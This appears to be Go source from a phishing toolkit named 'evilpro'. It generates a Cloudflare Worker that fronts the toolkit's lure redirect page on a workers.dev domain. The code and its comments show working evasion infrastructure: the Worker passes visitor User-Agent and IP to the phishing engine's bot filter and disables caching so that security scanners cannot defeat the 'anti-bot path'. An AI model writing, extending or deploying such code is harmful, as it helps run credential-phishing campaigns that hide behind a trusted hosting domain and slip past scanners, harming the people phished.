// The Cloudflare front: a thin Worker on the account's workers.dev domain that
// fronts the engine's *existing* redirect page.
//
// Route A on purpose. The Worker forwards the client User-Agent, keeps the
// upstream status (redirect: manual) and forbids caching (cacheTtl 0), so the
// bot decision, the branding, the template placeholders and the Turnstile
// injection all stay in ONE implementation on the engine. A cached copy served
// to a scanner is the only way this could silently break the anti-bot path, so
// caching is disabled at the fetch as well as on the outer response.
//
// Nothing about the lure changes: the page still points at the normal lure URL.
const frontWorkerNamePrefix = "evilpro-"

// frontWorkerName returns the Worker script name for a profile's domain, already
// sanitised to a valid DNS label.
func frontWorkerName(domain string) string {
	label := strings.ToLower(strings.TrimSpace(domain))
	if i := strings.Index(label, "."); i > 0 {
		label = label[:i]
	}
	re := regexp.MustCompile(`[^a-z0-9-]+`)
	label = re.ReplaceAllString(label, "-")
	label = strings.Trim(label, "-")
	if label == "" {
		label = "front"
	}
	name := frontWorkerNamePrefix + label
	if len(name) > 54 {
		name = name[:54]
	}
	return strings.Trim(name, "-")
}

// buildFrontWorker renders the Worker source.
//
// pages maps a URL path (without slashes) to the engine origin that serves it.
// An empty-string key is a catch-all: a worker fronting a single page answers on
// every path, so its link can be the bare host with no suffix. A worker named by
// several pages instead gets one key per page subdomain.
func buildFrontWorker(workerName string, pages map[string]string) string {
	slugs := make([]string, 0, len(pages))
	for s := range pages {
		slugs = append(slugs, s)
	}
	sort.Strings(slugs)

	var b strings.Builder
	b.WriteString("// Generated by evilpro. One Worker fronts the engine's redirect pages.\n")
	b.WriteString("// Do not edit by hand: redeploy from the panel instead.\n")
	b.WriteString("//\n")
	b.WriteString("// Why this is exact: the client User-Agent is forwarded, the upstream\n")
	b.WriteString("// status/Location is passed through unchanged (redirect: manual), and both\n")
	b.WriteString("// the subrequest (cf.cacheTtl 0) and the outer response (no-store) refuse to\n")
	b.WriteString("// cache. A cached copy served to a scanner would defeat the anti-bot path.\n")
	b.WriteString("var PAGES = {\n")
	for _, s := range slugs {
		b.WriteString(fmt.Sprintf("  %s: %s,\n", jsQuote(s), jsQuote(pages[s])))
	}
	b.WriteString("};\n\n")
	b.WriteString(`function handle(req) {
  var u = new URL(req.url);
  var seg = u.pathname.split("/").filter(function (p) { return p.length > 0; });
  var slug = seg.length > 0 ? seg[0] : "";
  // exact page match first, then a single-page worker's catch-all
  var origin = PAGES[slug];
  if (!origin && PAGES[""] !== undefined) origin = PAGES[""];
  if (!origin) {
    var lines = Object.keys(PAGES).filter(function (k) { return k !== ""; }).map(function (k) {
      return "  https://" + u.host + "/" + k + "  ->  " + PAGES[k];
    });
    return new Response(
      "front: no page for '" + slug + "'\n\n" + lines.join("\n") + "\n",
      { status: 404, headers: { "Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store" } }
    );
  }
  var origin2 = origin;
  return fetch(origin2 + "/", {
    method: "GET",
    headers: {
      "User-Agent": req.headers.get("User-Agent") || "",
      "Accept": req.headers.get("Accept") || "text/html,application/xhtml+xml",
      "Accept-Language": req.headers.get("Accept-Language") || "",
      "X-Forwarded-For": req.headers.get("CF-Connecting-IP") || ""
    },
    redirect: "manual",
    cf: { cacheTtl: 0, cacheEverything: false }
  }).then(function (up) {
    var h = new Headers(up.headers);
    h.set("Cache-Control", "no-store");
    // .dev is on the HSTS preload list, so browsers only ever use https. Say so
    // explicitly as well, for anything that is not preload aware.
    h.set("Strict-Transport-Security", "max-age=31536000");
    return new Response(up.body, { status: up.status, headers: h });
  });
}

addEventListener("fetch", function (event) {
  event.respondWith(handle(event.request));
});
`)
	return b.String()
}

func jsQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

